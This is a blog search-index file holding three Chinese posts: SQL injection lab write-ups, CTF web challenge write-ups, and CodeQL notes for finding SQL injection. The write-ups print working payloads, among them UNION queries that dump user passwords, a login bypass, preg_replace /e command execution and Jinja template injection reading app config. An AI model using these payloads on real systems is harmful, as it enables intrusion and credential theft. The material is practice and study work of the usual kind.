<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bp-sql</title>
    <url>/2024/07/07/Bp-sql/</url>
    <content><![CDATA[SQL注入备忘单
Lab：WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据此实验室在产品类别过滤器中包含 SQL 注入漏洞。当用户选择一个类别时，应用程序将执行如下 SQL 查询：
SELECT * FROM products WHERE category = &#x27;Gifts&#x27; AND released = 1

要完成该实验，请执行 SQL 注入攻击，导致应用程序显示一个或多个未发布的产品。

当我们进入环境之后，选择其中一个类别后，会自动给我们进行筛选然后仅显示出我们选择的类别中我们所能看到的东西
查询的sql语句如上所示
因此我们输入的payload为：/filter?category=Gifts&#39; or 1=1--+
Lab：允许绕过登录的 SQL 注入漏洞本实验的登录函数中存在 SQL 注入漏洞。要完成该实验，请执行 SQL 注入攻击，以 administrator 用户身份登录到应用程序。

进入环境的登陆界面，随便输入用户名和密码并抓包，如下：

从题目中我们已知管理员的账户名，但是不知道密码
因此我们可以在输入账号名的地方将剩下的sql语句全部注释掉，这样就不会验证到密码，密码可以随便填
输入账号：administrator&#39;#，被拦截
换一个注释符：administrator&#39;--+，成功
Lab：SQL注入攻击，查询Oracle上的数据库类型和版本此实验室在产品类别过滤器中包含 SQL 注入漏洞。您可以使用 UNION 攻击来检索注入查询的结果。要解决该实验，请显示数据库版本字符串

Oracle 上有一个名为 dual 的内置表，我们可以通过该表来实现目的
首先我们测试出为单引号包裹
再通过：/filter?category=Clothing%2c+shoes+and+accessories&#39; orderby 2--+判断出回显两个字段
继续：/filter?category=Clothing%2c+shoes+and+accessories&#39; union select &#39;abc&#39;,&#39;def&#39; from dual--+(Oracle默认是字符串)
查询资料得知要查看Oracle的版本号的语句为：select banner from v$version
由于要回显两个字段，所以第二个字段设为null
因此完整的注入语句为：/filter?category=Clothing%2c+shoes+and+accessories&#39; union select banner,null from v$version--+
成功回显出版本号，题目解决
Lab：SQL注入攻击，查询MySQL和Microsoft的数据库类型和版本此实验室在产品类别过滤器中包含 SQL 注入漏洞。您可以使用 UNION 攻击来检索注入查询的结果。
要解决该实验，请显示数据库版本字符串。

测试一下为单引号包裹，回显两个字段
所以注入：/filter?category=Gifts&#39; union select @@version,null--+
页面末尾回显版本号，题目解决
Lab：SQL注入攻击，列出非Oracle数据库上的数据库内容此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。该应用程序具有登录功能，数据库包含一个保存用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容以获得所有用户的用户名和密码。要完成实验，请以 administrator 用户身份登录。

首先拦截并修改设置产品类别过滤器的请求
测试出单引号包裹，回显两个字段，union注入启动
要注意Oracle数据库和mysql数据库还是有点不一样的
首先测出所有的表：?category=Gifts&#39;union select table_name,null from information_schema.tables--+
然后检索一下发现我们所需的表名为users_accvfs
接着测出该表的所有字段：?category=Gifts&#39;union select column_name,null from information_schema.columns where table_name=&#39;users_accvfs&#39;--+
得到我们所需的两个字段名，爆出其内容：?category=Gifts&#39;union select username_tvjrcf,password_lyiaeg from users_accvfs--+
得到管理员的密码

登录账号，题目解决
Lab：SQL注入攻击，列出Oracle上的数据库内容此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。
该应用程序具有登录功能，数据库包含一个保存用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容以获得所有用户的用户名和密码。要完成实验，请以 administrator 用户身份登录

要注意：在 Oracle 数据库上，每个 SELECT 语句必须指定一个表来选择 FROM 。如果您的 UNION SELECT 攻击不从表中查询，您仍然需要包含 FROM 关键字，后跟有效的表名称；Oracle数据库中有一个内置表dual
由于是查看Oracle数据库中的内容，所以我们要遵循其语法规范
首先获取到所有的表：?category=Gifts&#39;union select table_name,null from all_tables--+
得到我们所需的表后爆出所有的字段：?category=Gifts&#39;union select column_name,null from all_tab_columns where table_name=&#39;USERS_FSFWLB&#39;--+
获取到了两个我们需要的字段名，接着爆出其内容：?category=Gifts&#39;union select USERNAME_MIGUZK,PASSWORD_OAVFCV from USERS_FSFWLB--+
获取到管理员的密码
登录上去，题目解决
Lab：SQL注入UNION攻击，确定查询返回的列数此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。此类攻击的第一步是确定查询返回的列数。然后，您将在后续实验中使用此技术来构建完整的攻击。要完成该实验，请通过执行 SQL 注入 UNION 攻击（返回包含空值的附加行）来确定查询返回的列数。

就是确定回显的列数而已
要注意的是后面是要：&#39;union select null,null,null--+&#39;，需要的是null
Lab：SQL 注入 UNION 攻击，查找包含文本的列此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。要构建此类攻击，您首先需要确定查询返回的列数。您可以使用在之前的实验室中学到的技术来完成此操作。下一步是识别与字符串数据兼容的列。实验室将提供您需要使其出现在查询结果中的随机值。要完成该实验，请执行 SQL 注入 UNION 攻击，该攻击返回包含所提供值的附加行。此技术可帮助您确定哪些列与字符串数据兼容。

单引号包裹，回显列数为3
开始确定哪列可以与字符串数据兼容：?category=Pets&#39;union select null,&#39;waWdyd&#39;,null--+
测出是第二列，题目解决
Lab：SQL注入UNION攻击，从其他表检索数据此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。要构建此类攻击，您需要结合在之前的实验中学到的一些技术。该数据库包含一个名为 users 的不同表，其中包含名为 username 和 password 的列。要完成该实验，请执行 SQL 注入 UNION 攻击，检索所有用户名和密码，并使用该信息以 administrator 用户身份登录。

上面几题综合一下而已，没其他情况
Lab：SQL 注入 UNION 攻击，检索单个列中的多个值此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。该数据库包含一个名为 users 的不同表，其中包含名为 username 和 password 的列。要完成该实验，请执行 SQL 注入 UNION 攻击，检索所有用户名和密码，并使用该信息以 administrator 用户身份登录。

重点：?category=Pets&#39;union select null,concat(username,password) from users--+
一次回显两个字段
得到所需密码，题目解决
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-web刷题</title>
    <url>/2024/08/09/CTF-web%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[Cat首先打开题目环境，发现是如下的输入框

尝试输入127.0.0.1，回显如下

发现是get传参，输入ip后会ping一下
最开始以为是ssrf相关漏洞，尝试后发现并不是，那么应该就是跟ping相关的了
输入：127.0.0.1;ls，结果回显Invalid URL
那应该就是有字符过滤的了，掏出sqli_fuzz字典开始fuzz
结果发现当输入%a0的时候页面会直接会显出代码

一个html文件，将其代码复制后再打开

用游览器打开以后最底下可以看到一串提示：You’re seeing this error because you have DEBUG &#x3D; True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code.
也就是说，True in your Django settings file.有可能flag文件在 settings file 中。关键词搜索flag无果，查找数据库

将这个链接直接复制到输入框中，回车，无果
搜索一番，还是没有发现，只能去看其他大佬的文档，发现了@有关，php中curl函数@的作用PHP中curl的CURLOPT_POSTFIELDS参数使用细节 - 52php - 博客园
使用数组提供 post 数据时，CURL 组件大概是为了兼容 @filename 这种上传文件的写法，默认把 content_type 设为了 multipart/form-data。虽然对于大多数服务器并没有影响，但是还是有少部分服务器不兼容。

所以我们在该链接之前加个@，回显如下

关键词搜索ctf，得到flag，题目解决
ics-05打开环境，进入之后到处点击发现只有设备维护中心可以点进去，并且当我们再次点击该标题的时候url发生了改变

可以发现page的参数会回显回来，当我们输入index.php的时候回显ok
那么让我们来尝试读取一下该文件：/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
将回显的一大串base64编码后的数据复制解码，如下：
&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;    &lt;title&gt;设备维护中心&lt;/title&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class=&quot;layui-nav&quot;&gt;        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;        &lt;legend&gt;设备列表&lt;/legend&gt;    &lt;/fieldset&gt;    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;        &lt;!-- 这里的 checked 的状态只是演示 --&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin=&quot;switch&quot; lay-text=&quot;开|关&quot; lay-filter=&quot;checkDemo&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;    &lt;/script&gt;    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;    &lt;script&gt;    layui.use(&#x27;table&#x27;, function() &#123;        var table = layui.table,            form = layui.form;        table.render(&#123;            elem: &#x27;#test&#x27;,            url: &#x27;/somrthing.json&#x27;,            cellMinWidth: 80,            cols: [                [                    &#123; type: &#x27;numbers&#x27; &#125;,                     &#123; type: &#x27;checkbox&#x27; &#125;,                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,                     &#123; field: &#x27;name&#x27;, title: &#x27;设备名&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,                     &#123; field: &#x27;area&#x27;, title: &#x27;区域&#x27; &#125;,                     &#123; field: &#x27;status&#x27;, title: &#x27;维护状态&#x27;, minWidth: 120, sort: true &#125;,                     &#123; field: &#x27;check&#x27;, title: &#x27;设备开关&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;                ]            ],            page: true        &#125;);    &#125;);    &lt;/script&gt;    &lt;script&gt;    layui.use(&#x27;element&#x27;, function() &#123;        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块        //监听导航点击        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;            //console.log(elem)            layer.msg(elem.text());        &#125;);    &#125;);    &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;    &lt;div style=&quot;text-align:center&quot;&gt;        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;        &lt;div style=&quot;text-align:center&quot;&gt;            &lt;p class=&quot;lead&quot;&gt;                &lt;?php                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;                    die();                &#125;                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;                    die();                &#125;                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;                    die();                &#125;                if ($page === &#x27;index.php&#x27;) &#123;                    die(&#x27;Ok&#x27;);                &#125;                    include($page);                    die();                ?&gt;        &lt;/p&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;    $pattern = $_GET[pat];    $replacement = $_GET[rep];    $subject = $_GET[sub];    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;        preg_replace($pattern, $replacement, $subject);    &#125;else&#123;        die();    &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt;

很明显上面这么多的代码重点就在于最后的preg_replace函数这里，所以上网搜了搜有没有相关的漏洞：https://www.sqlsec.com/2020/07/preg_replace.html#%E5%9C%BA%E6%99%AF1-%E6%97%A0%E9%99%90%E5%88%B6%E4%BC%A0%E5%8F%82
发现我们可以利用修饰符&#x2F;e来进行代码执行
/index.php?pat=/233/e&amp;rep=phpinfo()&amp;sub=233

成功执行
执行寻找相关flag文件的代码：/index.php?pat=/233/e&amp;rep=system(&#39;find / -name &quot;flag&quot;&#39;)&amp;sub=233

找到的是个目录，下面还有文件
读取我们所需的flag文件：/index.php?pat=/233/e&amp;rep=system(&#39;tac /var/www/html/s3chahahaDir/flag/flag.php&#39;)&amp;sub=233
Lottery进入环境后可以发现该题是通过猜数字来获得奖金，攒够奖金后再用钱去购买flag
当然单纯靠玩是肯定拿不到那么多钱的，所以我们就必须看看是猜数字部分存在漏洞还是购买部分存在漏洞
题目给了附件，我们先去审计一下代码
可以发现相关的比较重要的文件就只有一个api.php
通过审计该文件可以发现玩家的金钱数量是存在session中的，无法直接更改，而购买flag的代码也没任何漏洞

我们再转去看函数buy
function buy($req)&#123;	require_registered();	require_min_money(2);	$money = $_SESSION[&#x27;money&#x27;];	$numbers = $req[&#x27;numbers&#x27;];	$win_numbers = random_win_nums();	$same_count = 0;	for($i=0; $i&lt;7; $i++)&#123;		if($numbers[$i] == $win_numbers[$i])&#123;			$same_count++;		&#125;	&#125;	switch ($same_count) &#123;		case 2:			$prize = 5;			break;		case 3:			$prize = 20;			break;		case 4:			$prize = 300;			break;		case 5:			$prize = 1800;			break;		case 6:			$prize = 200000;			break;		case 7:			$prize = 5000000;			break;		default:			$prize = 0;			break;	&#125;	$money += $prize - 2;	$_SESSION[&#x27;money&#x27;] = $money;	response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;,&#x27;numbers&#x27;=&gt;$numbers, &#x27;win_numbers&#x27;=&gt;$win_numbers, &#x27;money&#x27;=&gt;$money, &#x27;prize&#x27;=&gt;$prize]);&#125;

可以看出来该部分验证猜测数字是否正确用的是弱比较，而这是存在着漏洞的
===比较两个变量的值和类型；==比较两个变量的值，不比较数据类型。
在php中,如果bool和”任何其他类型”比较,”任何其他类型”会转换为bool。
在PHP中当转换为 boolean 时，以下值被认为是 FALSE ：(1) 布尔值 FALSE 本身(2) 整型值 0（零）(3)浮点型值 0.0（零）(4)空字符串，以及字符串 “0”(5)不包括任何元素的数组(注意,一旦包含元素,就算包含的元素只是一个空数组,也是true)(6)不包括任何成员变量的对象（仅 PHP 4.0 适用）(7)特殊类型 NULL（包括尚未赋值的变量）(8)从空标记生成的 SimpleXML 对象(9)所有其它值包括-1都被认为是 TRUE （包括任何资源）所以我们只要拦截相对应的响应包，更改上传的json数据即可，如下

这样子发送两次我们便有足够的钱来购买flag了，题目解决
shrine直接访问，给出源码如下：
import flaskimport os# 创建 Flask 应用实例app = flask.Flask(__name__)# 从环境变量中获取 FLAG，并从环境变量中删除它app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)# 首页路由：返回当前文件的源代码@app.route(&#x27;/&#x27;)def index():    with open(__file__) as f:        return f.read()# shrine 路由：根据用户传入的字符串动态生成模板@app.route(&#x27;/shrine/&#x27;)def shrine(shrine):    def safe_jinja(s: str) -&gt; str:        &quot;&quot;&quot;对输入字符串进行简单过滤以防止模板注入攻击。&quot;&quot;&quot;        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)  # 移除括号        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]  # 禁用关键字        # 使用 Jinja 语法将黑名单变量设置为 None        return &#x27;&#x27;.join([f&#x27;&#123;&#123;% set &#123;c&#125; = None %&#125;&#125;&#x27; for c in blacklist]) + s    # 渲染过滤后的模板    return flask.render_template_string(safe_jinja(shrine))# 启动 Flask 开发服务器if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)

源码中app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)提示flag在配置文件中，但有WAF；题目仍旧是flask框架，主要考点在shrine的限制函数，过滤了括号，还有黑名单
在config没有过滤的情况下，可以直接传入config获取设置信息；如果config被ban，还可以使用self.dict获取信息；但现在二者都被ban掉了，这个时候为获取信息， 仍需要用到一些变量或者函数，但是此时还过滤了括号，所以只能选在使用内置函数进行查询。
在带佬的wp引领下了解到python有两个此处可用的内置函数：url_for和get_flashed_message通过这两个函数，来查询现在app内的全局变量。(get_flashed_messages函数返回之前在Flask中通过flash()传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages()方法取出，闪现信息只能取出一次，取出后闪现信息会被清空。)
#http://192.168.32.138:65535/shrine/&#123;&#123;url_for.__globals__&#125;&#125;#http://192.168.32.138:65535/shrine/&#123;&#123;get_flashed_messages.__globals__&#125;&#125;&#123;&#x27;find_package&#x27;: &lt;function find_package at 0x7feca7eea140&gt;,  &#x27;_find_package_path&#x27;: &lt;function _find_package_path at 0x7feca7eea0c8&gt;,  &#x27;get_load_dotenv&#x27;: &lt;function get_load_dotenv at 0x7feca7ee2a28&gt;,  &#x27;_PackageBoundObject&#x27;: &lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;,  &#x27;current_app&#x27;: &lt;Flask &#x27;app&#x27;&gt;,  ......

在第五行看到current_app变量，且提示对应的就是当前app，查看当前config试试
#http://192.168.32.138:65535/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;#http://192.168.32.138:65535/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;&lt;Config &#123; ...... &#x27;FLAG&#x27;: &#x27;flag&#123;Tr0jAn_V1rU4&#125;&#x27;, ......&#125;&gt;

]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>CodeQl 入门</title>
    <url>/2025/08/23/CodeQl-%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[参考CodeQL入门
CodeQL入坟篇
New dataflow API for writing custom CodeQL queries
CodeQL踩坑日记and规则分享
前言下面为笔者初学codeql所记的笔记，涉及到的所有ql代码都是用于查询靶场中对应漏洞的
CodeQL 基本语法QL 语法用的是这个靶场 —— micro_service_seclab:，同理其实 JoyChou93 师傅之前所设计的靶场，也是可以用来做 CodeQL 练习的。

添加对应 database

codeql database create E:\mycode\codeql\CodeQL-Practice --language=&quot;java&quot; --source-root=E:\safety\CodeAudit\micro_service_seclab-main --command=&quot;mvn clean package -Dmaven.test.skip=true&quot;

--command=&quot;mvn clean package -Dmaven.test.skip=true&quot;告诉 CodeQL 如何编译源码

mvn clean package：用 Maven 清理并打包项目。
-Dmaven.test.skip=true：跳过测试代码的编译和执行（节省时间，避免测试失败阻碍）。

CodeQL 在构建数据库时，需要项目能成功编译，这样它才能捕获所有类、方法、调用关系等语义信息。 这里它会调用 Maven 编译过程来生成字节码并收集编译信息。
CodeQL的核心引擎是不开源的，这个核心引擎的作用之一是帮助我们把micro-service-seclab转换成CodeQL能识别的中间层数据库。
然后我们需要编写QL查询语句来获取我们想要的数据。

正如这张图描述的，由于CodeQL开源了所有的规则和规则库部分，所以我们能够做的就是编写符合我们业务逻辑的QL规则，然后使用CodeQL引擎去跑我们的规则，发现靶场的安全漏洞。
我们来简单地介绍一下本案例涉及到的CodeQL的基本语法。
基本语法包含3个部分。



名称
解释



Method
方法类，Method method 表示获取当前项目中所有的方法


MethodCall
方法调用类，MethodCall call 表示获取当前项目当中的所有方法调用


Parameter
参数类，Parameter 表示获取当前项目当中所有的参数


结合 ql 的语法，我们尝试获取 micro-service-seclab 项目当中定义的所有方法：
import java from Method methodselect method

我们再通过 Method 类内置的一些方法，把结果过滤一下。比如我们获取名字为 getStudent 的方法名称。
import java from Method methodwhere method.hasName(&quot;getStudent&quot;)select method.getName(), method.getDeclaringType()


method.getName() // 获取的是当前方法的名称method.getDeclaringType() / 获取的是当前方法所属class的名称。

谓词和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。
这个函数，就叫谓词。
比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：
import java predicate isStudent(Method method) &#123;exists(|method.hasName(&quot;getStudent&quot;))&#125; from Method methodwhere isStudent(method)select method.getName(), method.getDeclaringType()


语法解释

predicate 表示当前方法没有返回值。exists 子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回 true or false，来决定筛选出哪些数据。

设置 Source 和 Sink什么是source和sink
在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。
source 是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。
sink 是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。
sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。
只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。


设置 Source

在 micro_service_seclab 中，对应的 Source 举个例子，SQL 注入的代码
@RequestMapping(value = &quot;/one&quot;)  public List&lt;Student&gt; one(@RequestParam(value = &quot;username&quot;) String username) &#123;      return indexLogic.getStudent(username);  &#125;

对应 CodeQL 当中的 Source
override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;

RemoteFlowSource 类（在semmle.code.java.dataflow.FlowSources）中定义）表示可能由远程用户控制的数据流源
这里就是说：把所有远程输入都当作source
这里这段代码的传参比较简单，但其实传参如果复杂，比如是一个类的情况下，也是类似的
在下面的代码中，source就是Student user(user为Student类型，这个不受影响)。
@PostMapping(value = &quot;/object&quot;)public List&lt;Student&gt; objectParam(@RequestBody Student user) &#123;    return indexLogic.getStudent(user.getUsername());&#125;


设置 Sink

在本案例中，我们的sink应该为query方法(Method)的调用(MethodAccess)，所以我们设置Sink为：
override predicate isSink(DataFlow::Node sink) &#123;exists(Method method, MethodCall call |  method.hasName(&quot;query&quot;)  and  call.getMethod() = method and  sink.asExpr() = call.getArgument(0))&#125;

注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，并把它的第一个参数设置为sink。
在靶场系统(micro-service-seclab)中，sink就是：
jdbcTemplate.query(sql, ROW_MAPPER);

因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！
Flow数据流在设置完 Source 和 Sink 之后，我们需要确认 Source 到 Sink 是能够走通的，这一段的连通工作就是 CodeQL 引擎本身来完成的。我们通过 config.hasFlowPath(source, sink) 方法来判断是否连通。
比如如下代码：
module VulFlow = TaintTracking::Global&lt;VulConfig&gt;;from VulFlow::PathNode source, VulFlow::PathNode sinkwhere VulFlow::flowPath(source, sink)select source, sink, &quot;发现潜在的SQL注入漏洞&quot;

我们传递给 VulFlow::flowPath(source, sink) 我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。
CodeQL 语句优化初步成果经过整理之后的 ql 查询代码
/** @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSources/** 定义数据流配置 */module VulConfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node src) &#123;    src instanceof RemoteFlowSource  &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(Method method, MethodCall call |            method.hasName(&quot;query&quot;)            and            call.getMethod() = method and            sink.asExpr() = call.getArgument(0)        )  &#125;&#125;/** 用全局 taint tracking 建立路径 */module VulFlow = TaintTracking::Global&lt;VulConfig&gt;;from VulFlow::PathNode source, VulFlow::PathNode sinkwhere VulFlow::flowPath(source, sink)select source, sink, &quot;发现潜在的SQL注入漏洞&quot;

VulConfig：自定义一个污点追踪配置。
extends TaintTracking::Configuration：继承 CodeQL 提供的污点分析框架。
构造函数里 this = &quot;SqlInjectionConfig&quot;：给这个配置起个名字。

误报解决结果里面存在误报

这个方法的参数类型是List&lt;Long&gt;，不可能存在注入漏洞。
这说明我们的规则里，对于List&lt;Long&gt;，甚至List&lt;Integer&gt;类型都会产生误报，source误把这种类型的参数涵盖了。
我们需要采取手段消除这种误报。
这个手段就是isSanitizer。


isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是：
override predicate isSanitizer(DataFlow::Node node) {}
在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。
override predicate isSanitizer(DataFlow::Node node) {node.getType() instanceof PrimitiveType ornode.getType() instanceof BoxedType ornode.getType() instanceof NumberType}
表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在。

由于CodeQL检测SQL注入里的isSanitizer方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。
那我们只需要将这种复合类型加入到isSanitizer方法，即可消除这种误报。
在新版本里面isSanitizer方法已经全部统一到isBarrier方法下了
predicate isBarrier(DataFlow::Node node) &#123;  node.getType() instanceof PrimitiveType or        // 基本类型（int, char等）  node.getType() instanceof BoxedType or           // 包装类型（Integer, Boolean等）  node.getType() instanceof NumberType or          // 数字类型  exists(ParameterizedType pt|                     // 泛型类型    node.getType() = pt and     pt.getTypeArgument(0) instanceof NumberType    // 泛型参数为数字类型  )&#125;

以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。重新执行query，我们发现，刚才那条误报已经被成功消除啦。

漏报解决我们发现，如下的SQL注入并没有被CodeQL捕捉到。
public List&lt;Student&gt; getStudentWithOptional(Optional&lt;String&gt; username) &#123;        String sqlWithOptional = &quot;select * from students where username like &#x27;%&quot; + username.get() + &quot;%&#x27;&quot;;        //String sql = &quot;select * from students where username like ?&quot;;        return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);    &#125;

漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。
那我们如果通过CodeQL来解决漏报问题呢？答案就是通过 isAdditionalTaintStep 方法。
实现原理就一句话：断了就强制给它接上。

isAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是：override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;它的作用是将一个可控节点A强制传递给另外一个节点B，那么节点B也就成了可控节点。

这里由于 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 username 流转到username.get()，这样 username.get() 就变得可控了。这样应该就能识别出这个注入漏洞了
在新版的ql中使用 isAdditionalFlowStep 而不是污点跟踪谓词 isAdditionalTaintStep 
完整代码：
/** * @id java/examples/demo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSourcespredicate isTaintedString(Expr expSrc, Expr expDest) &#123;    exists(Method method, MethodCall call, MethodCall call1|        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method        and method.hasName(&quot;get&quot;) and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot;        and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;        )&#125;/** 定义数据流配置 */module VulConfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node src) &#123;    src instanceof RemoteFlowSource  &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(Method method, MethodCall call |            method.hasName(&quot;query&quot;)            and            call.getMethod() = method and            sink.asExpr() = call.getArgument(0)        )  &#125;   predicate isBarrier(DataFlow::Node node) &#123;    node.getType() instanceof PrimitiveType or    node.getType() instanceof BoxedType or    node.getType() instanceof NumberType or    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )  // 这里的 ParameterizedType 代表所有泛型，判断泛型当中的传参是否为 Number 型  &#125;  predicate isAdditionalFlowStep(DataFlow::Node node1, DataFlow::Node node2) &#123;        isTaintedString(node1.asExpr(), node2.asExpr())    &#125;&#125;/** 用全局 taint tracking 建立路径 */module VulFlow = TaintTracking::Global&lt;VulConfig&gt;;import VulFlow::PathGraphfrom VulFlow::PathNode source, VulFlow::PathNode sinkwhere VulFlow::flowPath(source, sink)select source.getNode(), source, sink, &quot;source&quot;

Lombok 插件漏报Lombok 的注解并不会直接被 CodeQL 所解析，导致其中的中间链路会“中道崩殂”，我们用以下方法来解决。
解决方法 ①使用 maven-delombok，在 pom.xml 中添加以下代码，重新编译即可。（推荐）
